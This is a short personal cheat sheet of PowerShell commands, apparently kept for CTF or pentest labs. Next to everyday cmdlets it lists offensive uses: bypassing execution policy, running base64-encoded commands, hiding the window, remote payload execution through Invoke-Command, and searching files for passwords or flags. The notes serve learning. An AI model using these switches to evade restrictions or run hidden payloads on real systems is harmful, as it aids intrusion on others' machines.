If I use something here often, I'll create a new heading for the specific command. # list commands Get-Command # get command by type (like cmdlet) Get-Command -CommandType "Function" # get help on specific command, like man Get-Help <command> # get a list of alias, like cd is Get-Content Get-Alias # cd, don't need -path Set-Location -Path # ls / dir Get-ChildItem # cat Get-Content # touch file or make diretory New-Item -Path "<path>" -ItemType "Directory" # remove directory or file Remove-Item -Path "<full_path>" # copy Copy-Item -Path "<path>" -Destination "<new_path>" # ls + pipe with sort by length Get-ChildItem | Sort-Object Length # filter by extension Get-ChildItem | Where-Object -Property "Extension" -eq ".txt" # filter by name Get-ChildItem | Where-Object -Property "Name" -like "flag*" # ls only columns you want Get-ChildItem | Select-Object Name,Length # grep Select-String -Path "<file>.txt" -Pattern "password" # services Get-WmiObjectWin32_Service | select Name, Startname # systeminfo Get-ComputerInfo # local user accounts Get-LocalUser # ipconfig Get-NetIPConfiguration # ipconfig 2.0 Get-NetIPAddress # list running processes Get-Process # list running services Get-Service # looks like netstat Get-NetTCPConnection # get filehash for authenticity checks Get-FileHash -Path <file> # Invoke-Command can execute payload remotely on other machines >:D Get-Help Invoke-Command -examples # ignore restrictions powershell.exe -ExecutionPolicy Bypass .\script.ps1 # allow scripts powershell.exe -ExecutionPolicy Unrestricted .\script.ps1 # execute base64 encoded cmd powershell.exe -EncodedCommand <encoded> # hide CLI powershell.exe -WindowStyle Hidden # search cmdlet in online repo Find-Module -Name "PowerShell*" # download cmdlet from online repo Install-Module -Name "PowerShellGet" # list sofware and its versions wmic product get name,version,vendor
